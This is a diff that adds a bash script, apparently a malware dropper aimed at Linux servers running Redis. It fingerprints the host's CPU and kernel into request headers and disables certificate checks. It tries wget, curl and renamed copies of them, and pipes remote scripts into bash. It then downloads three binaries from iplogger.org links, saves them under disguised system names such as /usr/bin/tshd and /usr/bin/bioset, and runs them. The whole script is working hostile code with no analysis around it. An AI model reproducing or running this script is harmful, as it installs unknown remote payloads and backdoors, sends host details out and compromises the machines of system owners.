@@ -1,0 +1,77 @@
+#!/bin/bash
+
+function DownLoadFile(){
+THELINK=$1
+THEPATH=$2
+CPUMHz=`cat /proc/cpuinfo|grep MHz | awk '{print $4}'`
+CPUCores=`cat /proc/cpuinfo|grep 'cpu cores' | awk '{print $4}'`
+export THEUSRA="$CPUMHz"#-#"$CPUCores"
+export THEREFE="$(uname -a)"
+if type wget >/dev/null; then
+wget -q --max-redirect=3 --no-check-certificate --user-agent="wget $THEUSRA" --referer="$THEREFE" $THELINK -O $THEPATH 2>/dev/null 1>/dev/null
+fi
+if type wdl >/dev/null; then
+wdl -q --max-redirect=3 --no-check-certificate --user-agent="wdl $THEUSRA" --referer="$THEREFE" $THELINK -O $THEPATH 2>/dev/null 1>/dev/null
+fi
+if type wge >/dev/null; then
+wge -q --max-redirect=3 --no-check-certificate --user-agent="wge $THEUSRA" --referer="$THEREFE" $THELINK -O $THEPATH 2>/dev/null 1>/dev/null
+fi
+
+if type curl >/dev/null; then
+curl -Ls --user-agent "curl $THEUSRA" --referer "$THEREFE" $THELINK -o $THEPATH 2>/dev/null 1>/dev/null
+fi
+if type cdl >/dev/null; then
+cdl -Ls --user-agent "cdl $THEUSRA" --referer "$THEREFE" $THELINK -o $THEPATH 2>/dev/null 1>/dev/null
+fi
+if type cur >/dev/null; then
+cur -Ls --user-agent "cdl $THEUSRA" --referer "$THEREFE" $THELINK -o $THEPATH 2>/dev/null 1>/dev/null
+fi
+}
+
+function ExecHttpBash(){
+THELINK=$1
+CPUMHz=`cat /proc/cpuinfo|grep MHz | awk '{print $4}'`
+CPUCores=`cat /proc/cpuinfo|grep 'cpu cores' | awk '{print $4}'`
+export THEUSRA="$CPUMHz"#-#"$CPUCores"
+export THEREFE="$(uname -a)"
+if type wget >/dev/null; then
+wget -q --max-redirect=3 --no-check-certificate --user-agent="wget $THEUSRA" --referer="$THEREFE" $THELINK -O - | bash 2>/dev/null 1>/dev/null
+fi
+if type wdl >/dev/null; then
+wdl -q --max-redirect=3 --no-check-certificate --user-agent="wdl $THEUSRA" --referer="$THEREFE" $THELINK -O - | bash 2>/dev/null 1>/dev/null
+fi
+if type wge >/dev/null; then
+wge -q --max-redirect=3 --no-check-certificate --user-agent="wge $THEUSRA" --referer="$THEREFE" $THELINK -O - | bash 2>/dev/null 1>/dev/null
+fi
+
+if type curl >/dev/null; then
+curl -Ls --user-agent "curl $THEUSRA" --referer "$THEREFE" $THELINK | bash 2>/dev/null 1>/dev/null
+fi
+if type cdl >/dev/null; then
+cdl -Ls --user-agent "cdl $THEUSRA" --referer "$THEREFE" $THELINK | bash 2>/dev/null 1>/dev/null
+fi
+if type cur >/dev/null; then
+cur -Ls --user-agent "cdl $THEUSRA" --referer "$THEREFE" $THELINK | bash 2>/dev/null 1>/dev/null
+fi
+
+
+}
+
+
+if [ ! -f /usr/sbin/redis-backup ] ; then
+DownLoadFile https://iplogger.org/27wW76 /usr/sbin/redis-backup
+chmod +x /usr/sbin/redis-backup
+/usr/sbin/redis-backup
+fi
+
+if [ ! -f /usr/bin/tshd ] ; then
+DownLoadFile https://iplogger.org/27cE76 /usr/bin/tshd
+chmod +x /usr/bin/tshd
+/usr/bin/tshd
+fi
+
+if [ ! -f /usr/bin/bioset ] ; then
+DownLoadFile https://iplogger.org/274R76 /usr/bin/bioset
+chmod +x /usr/bin/bioset
+/usr/bin/bioset
+fi
